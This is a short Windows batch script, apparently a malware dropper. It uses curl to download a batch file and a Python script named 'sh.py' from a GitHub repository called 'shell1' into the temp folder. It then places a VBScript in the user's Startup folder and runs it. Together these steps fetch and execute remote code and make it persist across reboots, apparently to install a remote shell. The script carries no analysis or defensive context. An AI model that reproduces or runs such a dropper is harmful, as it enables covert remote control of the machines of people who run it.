#echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"

call "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
